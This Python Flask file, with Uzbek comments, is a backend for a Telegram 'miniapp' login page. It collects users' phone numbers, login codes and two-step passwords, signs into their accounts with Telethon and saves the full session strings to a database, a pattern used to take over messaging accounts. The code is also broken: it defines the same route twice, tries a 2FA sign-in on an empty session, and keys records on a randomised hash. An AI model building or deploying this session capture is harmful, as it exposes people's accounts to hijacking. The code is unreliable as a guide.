# login_api.py
import os
import asyncio
from flask import Flask, request, jsonify, render_template
from database import save_login_code, get_login_code, delete_login_code
from telethon import TelegramClient
from telethon.errors import SessionPasswordNeededError
from telethon.sessions import StringSession

from database import get_db, save_session

API_HASH = os.getenv("API_HASH")
API_ID_RAW = os.getenv("API_ID")
API_ID = int(API_ID_RAW) if API_ID_RAW else None

app = Flask(__name__)
pending_codes = {}  # phone -> phone_code_hash


@app.route("/send_code", methods=["POST"])
def send_code():
    phone = request.json.get("phone")

    async def _send():
        client = TelegramClient(StringSession(), API_ID, API_HASH)
        await client.connect()
        result = await client.send_code_request(phone)
        await client.disconnect()
        return result.phone_code_hash

    try:
        phone_code_hash = asyncio.run(_send())
        save_login_code(phone, phone_code_hash)
        return jsonify({"status": "ok"})

    except Exception as e:
        return jsonify({"status": "error", "message": str(e)})


@app.route("/send_code", methods=["POST"])
def send_code():
    phone = request.json.get("phone")

    async def _send():
        client = TelegramClient(StringSession(), API_ID, API_HASH)
        await client.connect()
        result = await client.send_code_request(phone)
        session = client.session.save()
        await client.disconnect()
        return session

    session_str = asyncio.run(_send())

    # vaqtincha sessionni DB ga yozamiz
    conn = get_db()
    cur = conn.cursor()
    cur.execute("""
        INSERT INTO telegram_sessions (user_id, session)
        VALUES (%s, %s)
        ON CONFLICT (user_id) DO UPDATE SET session = EXCLUDED.session
    """, (hash(phone), session_str))
    conn.commit()
    conn.close()

    return jsonify({"status": "ok"})

@app.route("/verify_code", methods=["POST"])
def verify_code():
    phone = request.json.get("phone")
    code = request.json.get("code")

    conn = get_db()
    cur = conn.cursor()
    cur.execute("SELECT session FROM telegram_sessions WHERE user_id = %s", (hash(phone),))
    row = cur.fetchone()
    conn.close()

    if not row:
        return jsonify({"status": "error", "message": "Kod eskirgan"})

    async def _verify():
        client = TelegramClient(StringSession(row[0]), API_ID, API_HASH)
        await client.connect()

        try:
            await client.sign_in(phone=phone, code=code)
        except SessionPasswordNeededError:
            return "2fa"

        me = await client.get_me()
        session = client.session.save()
        await client.disconnect()
        return me, session

    result = asyncio.run(_verify())

    if result == "2fa":
        return jsonify({"status": "2fa_required"})

    me, final_session = result

    save_session(me.id, final_session)

    return jsonify({"status": "ok"})


        
@app.route("/verify_password", methods=["POST"])
def verify_password():
    phone = request.json.get("phone")
    password = request.json.get("password")

    async def _verify():
        client = TelegramClient(StringSession(), API_ID, API_HASH)
        await client.connect()
        await client.sign_in(password=password)

        me = await client.get_me()
        session_str = client.session.save()

        await client.disconnect()
        return me, session_str

    try:
        me, session_str = asyncio.run(_verify())

        save_session(me.id, session_str)

        conn = get_db()
        cur = conn.cursor()
        cur.execute("""
            INSERT INTO authorized_users (user_id, phone, username)
            VALUES (%s, %s, %s)
            ON CONFLICT (user_id) DO NOTHING
        """, (me.id, phone, me.username))
        conn.commit()
        conn.close()

        return jsonify({"status": "ok"})

    except Exception:
        return jsonify({"status": "error", "message": "Parol noto‘g‘ri"})


@app.route("/")
def index():
    return "LOGIN API ISHLAYAPTI"


@app.route("/miniapp")
def miniapp():
    return render_template("login.html")
